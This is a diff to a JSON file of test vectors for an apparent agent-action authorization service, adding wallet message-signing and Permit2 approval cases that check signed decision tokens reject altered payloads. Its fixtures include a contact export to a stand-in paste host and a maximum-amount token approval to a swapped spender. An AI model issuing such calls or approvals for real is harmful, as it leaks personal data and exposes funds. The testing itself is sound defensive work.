@@ -165,12 +165,255 @@
       "tool": null,
       "args": null
     },
+    "personal_sign": {
+      "kind": "evm_personal_sign",
+      "chain_id": 8453,
+      "from": "0x2222222222222222222222222222222222222222",
+      "tool": null,
+      "args": null,
+      "message": "0x5369676e20696e20746f206578616d706c652e636f6d"
+    },
+    "personal_sign_noncanonical_input": {
+      "kind": "evm_personal_sign",
+      "chain_id": 8453,
+      "from": "0x2222222222222222222222222222222222222222",
+      "tool": null,
+      "args": null,
+      "message": "0x5369676E20696E20746F206578616D706C652E636F6D"
+    },
+    "personal_sign_other_message": {
+      "kind": "evm_personal_sign",
+      "chain_id": 8453,
+      "from": "0x2222222222222222222222222222222222222222",
+      "tool": null,
+      "args": null,
+      "message": "0x5369676e20696e20746f206578616d706c652e636f6d00"
+    },
     "tool_call": {
       "kind": "tool_call",
       "tool": "crm.export_contacts",
       "args": {
         "destination": "https://paste.example/upload",
         "limit": 50000
+      }
+    },
+    "typed_data": {
+      "kind": "evm_typed_data",
+      "chain_id": 8453,
+      "from": "0x2222222222222222222222222222222222222222",
+      "tool": null,
+      "args": null,
+      "typed_data": {
+        "types": {
+          "EIP712Domain": [
+            {
+              "name": "name",
+              "type": "string"
+            },
+            {
+              "name": "chainId",
+              "type": "uint256"
+            },
+            {
+              "name": "verifyingContract",
+              "type": "address"
+            }
+          ],
+          "PermitDetails": [
+            {
+              "name": "token",
+              "type": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint160"
+            },
+            {
+              "name": "expiration",
+              "type": "uint48"
+            },
+            {
+              "name": "nonce",
+              "type": "uint48"
+            }
+          ],
+          "PermitSingle": [
+            {
+              "name": "details",
+              "type": "PermitDetails"
+            },
+            {
+              "name": "spender",
+              "type": "address"
+            },
+            {
+              "name": "sigDeadline",
+              "type": "uint256"
+            }
+          ]
+        },
+        "primaryType": "PermitSingle",
+        "domain": {
+          "chainId": 8453,
+          "name": "Permit2",
+          "verifyingContract": "0x000000000022D473030F116dDEE9F6B43aC78BA3"
+        },
+        "message": {
+          "details": {
+            "amount": "250000000",
+            "expiration": "1764064800",
+            "nonce": "0",
+            "token": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+          },
+          "sigDeadline": "1762078800",
+          "spender": "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"
+        }
+      }
+    },
+    "typed_data_other_amount": {
+      "kind": "evm_typed_data",
+      "chain_id": 8453,
+      "from": "0x2222222222222222222222222222222222222222",
+      "tool": null,
+      "args": null,
+      "typed_data": {
+        "types": {
+          "EIP712Domain": [
+            {
+              "name": "name",
+              "type": "string"
+            },
+            {
+              "name": "chainId",
+              "type": "uint256"
+            },
+            {
+              "name": "verifyingContract",
+              "type": "address"
+            }
+          ],
+          "PermitDetails": [
+            {
+              "name": "token",
+              "type": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint160"
+            },
+            {
+              "name": "expiration",
+              "type": "uint48"
+            },
+            {
+              "name": "nonce",
+              "type": "uint48"
+            }
+          ],
+          "PermitSingle": [
+            {
+              "name": "details",
+              "type": "PermitDetails"
+            },
+            {
+              "name": "spender",
+              "type": "address"
+            },
+            {
+              "name": "sigDeadline",
+              "type": "uint256"
+            }
+          ]
+        },
+        "primaryType": "PermitSingle",
+        "domain": {
+          "chainId": 8453,
+          "name": "Permit2",
+          "verifyingContract": "0x000000000022D473030F116dDEE9F6B43aC78BA3"
+        },
+        "message": {
+          "details": {
+            "amount": "1461501637330902918203684832716283019655932542975",
+            "expiration": "1764064800",
+            "nonce": "0",
+            "token": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+          },
+          "sigDeadline": "1762078800",
+          "spender": "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"
+        }
+      }
+    },
+    "typed_data_other_spender": {
+      "kind": "evm_typed_data",
+      "chain_id": 8453,
+      "from": "0x2222222222222222222222222222222222222222",
+      "tool": null,
+      "args": null,
+      "typed_data": {
+        "types": {
+          "EIP712Domain": [
+            {
+              "name": "name",
+              "type": "string"
+            },
+            {
+              "name": "chainId",
+              "type": "uint256"
+            },
+            {
+              "name": "verifyingContract",
+              "type": "address"
+            }
+          ],
+          "PermitDetails": [
+            {
+              "name": "token",
+              "type": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint160"
+            },
+            {
+              "name": "expiration",
+              "type": "uint48"
+            },
+            {
+              "name": "nonce",
+              "type": "uint48"
+            }
+          ],
+          "PermitSingle": [
+            {
+              "name": "details",
+              "type": "PermitDetails"
+            },
+            {
+              "name": "spender",
+              "type": "address"
+            },
+            {
+              "name": "sigDeadline",
+              "type": "uint256"
+            }
+          ]
+        },
+        "primaryType": "PermitSingle",
+        "domain": {
+          "chainId": 8453,
+          "name": "Permit2",
+          "verifyingContract": "0x000000000022D473030F116dDEE9F6B43aC78BA3"
+        },
+        "message": {
+          "details": {
+            "amount": "250000000",
+            "expiration": "1764064800",
+            "nonce": "0",
+            "token": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+          },
+          "sigDeadline": "1762078800",
+          "spender": "0x9f30000000000000000000000000000000000c21"
+        }
       }
     }
   },
@@ -211,9 +454,39 @@
       "payload_hash": "sha256:0aa77129f3b1008968c6ca4d78a5af908ab62a1c13b9e8fbf1489bf4780c7869"
     },
     {
+      "action": "personal_sign",
+      "canonical": "{\"chain_id\":8453,\"from\":\"0x2222222222222222222222222222222222222222\",\"kind\":\"evm_personal_sign\",\"message\":\"0x5369676e20696e20746f206578616d706c652e636f6d\",\"v\":1}",
+      "payload_hash": "sha256:86f11566964ffc8c13d0638f1164ee039112b1bc04081ca59ac8751e3e49bc3e"
+    },
+    {
+      "action": "personal_sign_noncanonical_input",
+      "canonical": "{\"chain_id\":8453,\"from\":\"0x2222222222222222222222222222222222222222\",\"kind\":\"evm_personal_sign\",\"message\":\"0x5369676e20696e20746f206578616d706c652e636f6d\",\"v\":1}",
+      "payload_hash": "sha256:86f11566964ffc8c13d0638f1164ee039112b1bc04081ca59ac8751e3e49bc3e"
+    },
+    {
+      "action": "personal_sign_other_message",
+      "canonical": "{\"chain_id\":8453,\"from\":\"0x2222222222222222222222222222222222222222\",\"kind\":\"evm_personal_sign\",\"message\":\"0x5369676e20696e20746f206578616d706c652e636f6d00\",\"v\":1}",
+      "payload_hash": "sha256:639e6b561fc27354f601e1d9a349af67a21e024ed4607c9ca40958bd565cc3d4"
+    },
+    {
       "action": "tool_call",
       "canonical": "{\"args\":{\"destination\":\"https://paste.example/upload\",\"limit\":50000},\"kind\":\"tool_call\",\"tool\":\"crm.export_contacts\",\"v\":1}",
       "payload_hash": "sha256:550d895ddae3c590a5a7c3b8bf9fdd3f916f230ab0362dbfa30de471b8cf9d91"
+    },
+    {
+      "action": "typed_data",
+      "canonical": "{\"chain_id\":8453,\"from\":\"0x2222222222222222222222222222222222222222\",\"kind\":\"evm_typed_data\",\"typed_data\":{\"domain\":{\"chainId\":8453,\"name\":\"Permit2\",\"verifyingContract\":\"0x000000000022D473030F116dDEE9F6B43aC78BA3\"},\"message\":{\"details\":{\"amount\":\"250000000\",\"expiration\":\"1764064800\",\"nonce\":\"0\",\"token\":\"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913\"},\"sigDeadline\":\"1762078800\",\"spender\":\"0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD\"},\"primaryType\":\"PermitSingle\",\"types\":{\"EIP712Domain\":[{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"chainId\",\"type\":\"uint256\"},{\"name\":\"verifyingContract\",\"type\":\"address\"}],\"PermitDetails\":[{\"name\":\"token\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint160\"},{\"name\":\"expiration\",\"type\":\"uint48\"},{\"name\":\"nonce\",\"type\":\"uint48\"}],\"PermitSingle\":[{\"name\":\"details\",\"type\":\"PermitDetails\"},{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"sigDeadline\",\"type\":\"uint256\"}]}},\"v\":1}",
+      "payload_hash": "sha256:1572ce52e67694d163e7c4290367484ddfed7531ab9e53ec1945bcba330150d3"
+    },
+    {
+      "action": "typed_data_other_amount",
+      "canonical": "{\"chain_id\":8453,\"from\":\"0x2222222222222222222222222222222222222222\",\"kind\":\"evm_typed_data\",\"typed_data\":{\"domain\":{\"chainId\":8453,\"name\":\"Permit2\",\"verifyingContract\":\"0x000000000022D473030F116dDEE9F6B43aC78BA3\"},\"message\":{\"details\":{\"amount\":\"1461501637330902918203684832716283019655932542975\",\"expiration\":\"1764064800\",\"nonce\":\"0\",\"token\":\"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913\"},\"sigDeadline\":\"1762078800\",\"spender\":\"0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD\"},\"primaryType\":\"PermitSingle\",\"types\":{\"EIP712Domain\":[{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"chainId\",\"type\":\"uint256\"},{\"name\":\"verifyingContract\",\"type\":\"address\"}],\"PermitDetails\":[{\"name\":\"token\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint160\"},{\"name\":\"expiration\",\"type\":\"uint48\"},{\"name\":\"nonce\",\"type\":\"uint48\"}],\"PermitSingle\":[{\"name\":\"details\",\"type\":\"PermitDetails\"},{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"sigDeadline\",\"type\":\"uint256\"}]}},\"v\":1}",
+      "payload_hash": "sha256:179d1010c7b6b4273db4a586903dc458278bd263be9d042b0aaa27939ad4911d"
+    },
+    {
+      "action": "typed_data_other_spender",
+      "canonical": "{\"chain_id\":8453,\"from\":\"0x2222222222222222222222222222222222222222\",\"kind\":\"evm_typed_data\",\"typed_data\":{\"domain\":{\"chainId\":8453,\"name\":\"Permit2\",\"verifyingContract\":\"0x000000000022D473030F116dDEE9F6B43aC78BA3\"},\"message\":{\"details\":{\"amount\":\"250000000\",\"expiration\":\"1764064800\",\"nonce\":\"0\",\"token\":\"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913\"},\"sigDeadline\":\"1762078800\",\"spender\":\"0x9f30000000000000000000000000000000000c21\"},\"primaryType\":\"PermitSingle\",\"types\":{\"EIP712Domain\":[{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"chainId\",\"type\":\"uint256\"},{\"name\":\"verifyingContract\",\"type\":\"address\"}],\"PermitDetails\":[{\"name\":\"token\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint160\"},{\"name\":\"expiration\",\"type\":\"uint48\"},{\"name\":\"nonce\",\"type\":\"uint48\"}],\"PermitSingle\":[{\"name\":\"details\",\"type\":\"PermitDetails\"},{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"sigDeadline\",\"type\":\"uint256\"}]}},\"v\":1}",
+      "payload_hash": "sha256:d34cb0bbd3d74eba11d7024dd185323c8af67b083562058b76ee7f364fc4cc8d"
     }
   ],
   "tokens": [
@@ -250,6 +523,90 @@
           "identity": "requester",
           "now": 1793613610,
           "want": "OK"
+        }
+      ]
+    },
+    {
+      "name": "allow_typed_data",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2OjE1NzJjZTUyZTY3Njk0ZDE2M2U3YzQyOTAzNjc0ODRkZGZlZDc1MzFhYjllNTNlYzE5NDViY2JhMzMwMTUwZDMiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.0zSsirzwwjn5ekoCuTYGqwO0o2fiCLY9CbMIu4R-Hg9YRXxCrLA86CLhSYJzplutQkrop0yNKAI6jbsh9Q_SCQ",
+      "presentations": [
+        {
+          "action": "typed_data",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "OK"
+        }
+      ]
+    },
+    {
+      "name": "payload_mismatch_typed_data_amount",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2OjE1NzJjZTUyZTY3Njk0ZDE2M2U3YzQyOTAzNjc0ODRkZGZlZDc1MzFhYjllNTNlYzE5NDViY2JhMzMwMTUwZDMiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.0zSsirzwwjn5ekoCuTYGqwO0o2fiCLY9CbMIu4R-Hg9YRXxCrLA86CLhSYJzplutQkrop0yNKAI6jbsh9Q_SCQ",
+      "presentations": [
+        {
+          "action": "typed_data_other_amount",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "PAYLOAD_MISMATCH"
+        }
+      ]
+    },
+    {
+      "name": "payload_mismatch_typed_data_spender",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2OjE1NzJjZTUyZTY3Njk0ZDE2M2U3YzQyOTAzNjc0ODRkZGZlZDc1MzFhYjllNTNlYzE5NDViY2JhMzMwMTUwZDMiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.0zSsirzwwjn5ekoCuTYGqwO0o2fiCLY9CbMIu4R-Hg9YRXxCrLA86CLhSYJzplutQkrop0yNKAI6jbsh9Q_SCQ",
+      "presentations": [
+        {
+          "action": "typed_data_other_spender",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "PAYLOAD_MISMATCH"
+        }
+      ]
+    },
+    {
+      "name": "payload_mismatch_typed_data_as_tx",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2OjE1NzJjZTUyZTY3Njk0ZDE2M2U3YzQyOTAzNjc0ODRkZGZlZDc1MzFhYjllNTNlYzE5NDViY2JhMzMwMTUwZDMiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.0zSsirzwwjn5ekoCuTYGqwO0o2fiCLY9CbMIu4R-Hg9YRXxCrLA86CLhSYJzplutQkrop0yNKAI6jbsh9Q_SCQ",
+      "presentations": [
+        {
+          "action": "evm",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "PAYLOAD_MISMATCH"
+        }
+      ]
+    },
+    {
+      "name": "allow_personal_sign",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2Ojg2ZjExNTY2OTY0ZmZjOGMxM2QwNjM4ZjExNjRlZTAzOTExMmIxYmMwNDA4MWNhNTlhYzg3NTFlM2U0OWJjM2UiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.eZvXrLZXWL2U2GuYF4ucRLKux-Ct6SBHgDQEn-hP8qaFtxNqZ6kAq8zYLHZVI_WqfdS8c1XDYr7EKxSscU8vBQ",
+      "presentations": [
+        {
+          "action": "personal_sign",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "OK"
+        }
+      ]
+    },
+    {
+      "name": "allow_personal_sign_noncanonical_input",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2Ojg2ZjExNTY2OTY0ZmZjOGMxM2QwNjM4ZjExNjRlZTAzOTExMmIxYmMwNDA4MWNhNTlhYzg3NTFlM2U0OWJjM2UiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.eZvXrLZXWL2U2GuYF4ucRLKux-Ct6SBHgDQEn-hP8qaFtxNqZ6kAq8zYLHZVI_WqfdS8c1XDYr7EKxSscU8vBQ",
+      "presentations": [
+        {
+          "action": "personal_sign_noncanonical_input",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "OK"
+        }
+      ]
+    },
+    {
+      "name": "payload_mismatch_personal_sign_message",
+      "token": "eyJhbGciOiJFZERTQSIsImtpZCI6InFaMG13ZGVyY2psTXE4Q2twMnA3VFFpTEtqcWJrV3A1Rlk2cDRlSzdmZnciLCJ0eXAiOiJzdG9wYmFyLWRlY2lzaW9uLXYyK2p3cyJ9.eyJhZ2VudF9pZCI6InRyYWRpbmctYm90LTEiLCJhdWQiOiJzaWduZXI6bG9jYWwtMSIsImF1dGhfbWV0aG9kIjoiYXBpX2tleSIsImV4cCI6MTc5MzYxMzY2MCwiaWF0IjoxNzkzNjEzNjAwLCJpc3MiOiJzdG9wYmFyOnRlc3QiLCJrZXlfaWQiOiJha18wMSIsIm5vbmNlIjoiWm1sNGRIVnlaUzF1YjI1alpTMHdNREF4Iiwib3V0Y29tZSI6ImFsbG93IiwicGF5bG9hZF9oYXNoIjoic2hhMjU2Ojg2ZjExNTY2OTY0ZmZjOGMxM2QwNjM4ZjExNjRlZTAzOTExMmIxYmMwNDA4MWNhNTlhYzg3NTFlM2U0OWJjM2UiLCJwb2xpY3lfYnVuZGxlX2hhc2giOiJzaGEyNTY6MmMyNmI0NmI2OGZmYzY4ZmY5OWI0NTNjMWQzMDQxMzQxMzQyMmQ3MDY0ODNiZmEwZjk4YTVlODg2MjY2ZTdhZSIsInJlcXVlc3RfaWQiOiJyZXFfMDFKRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEiLCJyZXNlcnZhdGlvbl9pZCI6InJzdl8wMUpEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSIsInRlbmFudCI6ImFjbWUiLCJ2IjoyfQ.eZvXrLZXWL2U2GuYF4ucRLKux-Ct6SBHgDQEn-hP8qaFtxNqZ6kAq8zYLHZVI_WqfdS8c1XDYr7EKxSscU8vBQ",
+      "presentations": [
+        {
+          "action": "personal_sign_other_message",
+          "identity": "requester",
+          "now": 1793613610,
+          "want": "PAYLOAD_MISMATCH"
         }
       ]
     },
